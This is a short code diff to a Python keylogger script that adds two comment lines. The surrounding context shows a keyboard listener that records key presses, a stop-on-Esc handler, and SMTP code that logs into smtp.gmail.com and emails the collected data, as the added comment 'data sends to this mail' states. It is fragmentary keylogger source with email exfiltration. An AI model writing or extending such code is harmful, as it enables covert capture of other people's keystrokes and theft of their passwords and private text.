@@ -35,6 +35,7 @@ def on_key_press(Key):
             print("\n{} Pressed\n".format(Key))
 
 def on_key_release(Key):
+    #
     #This stops the Listener/Keylogger.
     #You can use any key you like by replacing "esc" with the key of your choice
     if(Key == keyboard.Key.esc):
@@ -54,5 +55,6 @@ server = smtplib.SMTP('smtp.gmail.com', port)
 server.starttls()
 server.login(sender_mail,password)
 server.sendmail(sender_mail,receiver_mail,message)
+#data sends to this mail
 print("Email Sent to ",sender_mail)
 server.quit()
